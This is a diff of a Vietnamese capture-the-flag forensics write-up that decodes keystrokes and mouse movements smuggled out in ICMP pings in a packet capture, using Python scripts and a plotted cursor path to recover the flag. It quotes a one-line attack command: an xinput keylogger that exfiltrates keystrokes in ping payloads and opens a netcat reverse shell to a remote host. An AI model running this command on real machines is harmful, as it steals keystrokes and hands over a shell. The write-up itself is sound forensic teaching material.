@@ -1,8 +1,14 @@
-![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-05-15%20223501.png)
+Mở file pcap ra và phân tích protocol hierarchy, ta thấy lượng lớn ICMP:
+![image](https://github.com/NVex0/uWU/assets/113530029/61e34c0e-e5b4-4132-b396-fdbc82f38d5d)
 
-Keyboard
+Xem theo tcp stream, ta để ý server packet có đoạn có command như này:
+`xinput test 8 | while read -r line; do hex_data=$(echo "$line" | xxd -p -c 10); echo "$hex_data" | while read -r data; do ping -c 1 -p "$data" 192.168.253.27; done; done > /dev/null 2>&1 & nc 192.168.253.27 5349 -e /bin/bash`
+![image](https://github.com/NVex0/uWU/assets/113530029/011f5000-1a8e-4134-bbbc-be649a70cee2)
 
-```py
+Cụ thể là nó lấy mỗi 10 bytes data từ xinput 8 (keyboard), sau đó ping tới 192.168.253.27 bằng data đó. Bây giờ ta tiến hành extract data và dịch lại đầu vào thôi :v 
+
+Mình viết script sau để làm việc đó:
+```
 import os
 import sys
 
@@ -36,9 +42,31 @@ with open("hex.data", "r") as f:
         else:
             toogle = True
 ```
+Run code trên kèm file pcap `python extract.py ActionCapture.pcapng`, ta được đầu ra như này:
 
-Mouse:
-```py
+![image](https://github.com/NVex0/uWU/assets/113530029/b441926e-eb85-42c4-bb29-a1caa01fda31)
+
+Decimal flag, ném lên cyberchef và ta được part 1:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/23a0ce73-89c9-494f-a8ec-4a7aedc1febf)
+
+
+
+Ok, tiếp part 2. Nhìn vào tcp stream 1, ta thấy được cách send data tương tự tcp stream 0, chỉ khác là xinput id 10 là chuột. Event của chuột sẽ gồm toạ độ x, y của cursor. Vẫn extract ra và dịch nó ra thôi :v 
+```
+with open("hex.data", "r") as f:
+    data = f.readlines()
+    for i in data:
+        i = bytes.fromhex(i[24:44]).decode('ASCII')
+        print(i, end = "")
+```
+Run script này vào save file `txt`:
+`python tmp.py > txt`
+
+File txt này chứa toàn bộ motion mà ta extract ra được, tiếp theo là dựng lại đường của cursor dựa trên toạ độ thôi :v 
+
+Extract ra với script `Mickey.py`:
+```
 import matplotlib.pyplot as plt
 
 x = []
@@ -56,4 +84,13 @@ with open("txt", "r") as f:
     plt.plot(x, y)
     plt.show()
 ```
-    
+
+Chạy file `Mickey,py`, được kết quả sau:
+
+![image](https://github.com/NVex0/uWU/assets/113530029/93bd8a39-5fd4-40d4-be05-2d6487c433ae)
+
+Flip nó lại theo chiều dọc, được part 2 của flag:
+![Screenshot (3950)](https://github.com/NVex0/uWU/assets/113530029/7f4d1dad-d377-42b5-9233-e047b0296fc9)
+
+
+FLAG : `KCSC{g00d_luck_have_fuN1337}`
